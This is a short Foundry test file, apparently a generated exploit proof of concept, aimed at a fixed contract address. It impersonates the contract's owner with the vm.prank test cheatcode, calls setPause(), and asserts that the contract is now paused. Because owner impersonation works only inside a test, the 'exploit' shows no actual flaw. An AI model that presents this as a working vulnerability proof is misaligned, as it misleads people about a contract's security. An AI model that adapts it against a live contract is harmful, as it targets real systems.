// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILPP {
    function owner() external view returns (address);
    function setPause() external;
    function pause() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET address
        // and impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner address
        address owner = ILPP(TARGET).owner();

        // Label for debugging
        vm.label(owner, "Contract Owner");

        // Impersonate the owner and call setPause()
        vm.prank(owner);
        ILPP(TARGET).setPause();

        // Verify pause is now true
        bool isPaused = ILPP(TARGET).pause();
        assertEq(isPaused, true, "Pause should be enabled");
        assertEq(ILPP(TARGET).pause(), true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

